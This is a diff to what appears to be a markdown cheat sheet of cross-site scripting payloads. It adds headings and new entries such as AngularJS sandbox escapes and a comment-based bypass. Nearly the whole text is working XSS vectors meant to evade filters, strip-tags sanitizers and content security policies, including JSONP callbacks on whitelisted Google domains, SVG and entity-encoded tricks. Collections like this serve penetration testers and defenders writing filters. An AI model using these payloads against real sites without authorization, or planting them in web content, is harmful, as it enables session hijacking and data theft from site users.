@@ -1,3 +1,5 @@
+## Basic Payloads:
+
 ```
 &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
 <scr<!--comment-->ipt>alert('XSS')</scr<!--comment-->ipt>
@@ -21,43 +23,41 @@ ${alert(1)}
 ```
 
 
-Use this where text boxes, comment sections, etc that alows some markup input.
-
+## Use this where text boxes, comment sections, etc that alows some markup input.
 ```
 [clickme](javascript:alert`1`)
 ```
 
-XML Based XSS
-
+## XML Based XSS
 ```
 <x:script xmlns:x="http:/www.w3.org/1999/xhtml">alert(1)</x:script>
 <x:script xmlns:x="http:/www.w3.org/1999/xhtml" src="collaborattor"/>
 ```
 
-AngularJS Injections (v1.6 and up)
-
+## AngularJS Injections (v1.6 and up)
 ```
 {{$new.constructor('alert(1)')()}}
 <x ng-app>{{$new.constructor('alert(1)')()}}
+{{$new.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
+&#123&#123$new.constructor('alert(1)')()&#125&#125
+<x ng-init=a='alert(1)'>{{$new.constructor(a)()}}
+
 ```
 
 
-XSS in SSI 
-
+## XSS in SSI 
 ```
 <<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
 ```
 
-Injection in JSP Path
-
+## Injection in JSP Path
 ```
 /DOMAIN/PATH/;<svg onload=alert(1)>
 /DOMAIN/PATH/;"><svg onload=alert(1)>
 ```
 
 
-Alert without Parentheses
-
+## Alert without Parentheses
 ```
 setTimeout`alert\x28document.domain\x29`
 setInterval`alert\x28document.domain\x29`
@@ -67,44 +67,40 @@ setInterval`alert\x28document.domain\x29`
 ```
 
 
-Alert Alternative – Open Pseudo-Protocol
-
+## Alert Alternative – Open Pseudo-Protocol
 ```
 top.open`javas\cript:al\ert\x281\x29`
 top.open`javas\cript:al\ert\x281\x29${0}0`
 ```
 
 
-Alert Alternative - Eval + URL
-
+## Alert Alternative - Eval + URL
 ```
 <svg onload=eval(" ' "+URL)>
 <svg id=eval onload=top[id](" ' "+URL)>
 ```
 
-HTML Injection - Inline Alternative
-
+## HTML Injection - Inline Alternative
 ```
 "onpointerover=alert(1) /
 "autofocus onfocusin=alert(1) /
+"'>confirm&lpar;1)</Script><Svg><Script/1='
 ```
 
-Strip-Tags Based Bypass
-
+## Strip-Tags Based Bypass
 ```
 "o<x>nmouseover=alert<x>(1)/
 "autof<x>ocus o<x>nfocus=alert<x>(1)/
 ```
 
-Jump to URL Fragment
+## Jump to URL Fragment
 ```
 eval(URL.slice(-8)) #alert(1)
 eval(location.hash.slice(1)) #alert(1)
 document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
 ```
 
-CSP Bypass (for Whitelisted Google Domains)
-
+## CSP Bypass (for Whitelisted Google Domains)
 ```
 <script src=/www.google.com/complete/search?client=chrome%26jsonp=alert(1)> </script>
 <script src=/www.googleapis.com/customsearch/v1?calback=alert(1)></script>
@@ -113,15 +109,13 @@ CSP Bypass (for Whitelisted Google Domains)
 ```
 
 
-SVG Vectors with Event Handlers
-
+## SVG Vectors with Event Handlers
 ```
 <svg><set onbegin=alert(1)>
 <svg><set end=1 onend=alert(1)>
 ```
 
-SVG Vectors without Event Handlers
-
+## SVG Vectors without Event Handlers
 ```
 <svg><a><rect width=99% height=99% /><animate attributeName=href to=javascript:alert(1)>
 <svg><a><rect width=99% height=99% /><animate attributeName=href values=javascript:alert(1)>
@@ -129,7 +123,7 @@ SVG Vectors without Event Handlers
 <svg><use xlink:href=data:image/svg%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
 ```
 
-Vectors without Event Handlers
+## Vectors without Event Handlers
 ```
 <script>alert(1)</script>
 <script src=data:,alert(1)>
@@ -150,8 +144,7 @@ Vectors without Event Handlers
 <math><brute xlink:href=javascript:alert(1)>click
 ```
 
-Vectors with Agnostic Event Handlers
-
+## Vectors with Agnostic Event Handlers
 ```
 <x contenteditable onblur=alert(1)>lose focus!
 <x onclick=alert(1)>click this!
@@ -186,7 +179,7 @@ Vectors with Agnostic Event Handlers
 
 
 
-Mixed Context Reflection Entity Bypass
+## Mixed Context Reflection Entity Bypass
 
 ```
 ">'-alert(1)-'<svg>
@@ -195,5 +188,9 @@ Mixed Context Reflection Entity Bypass
 "&#34>alert(1)-&#34<svg>
 ```
 
+## Bypass using Comments
 
+```
+<!--><svg onload=alert(1)-->
+```
 
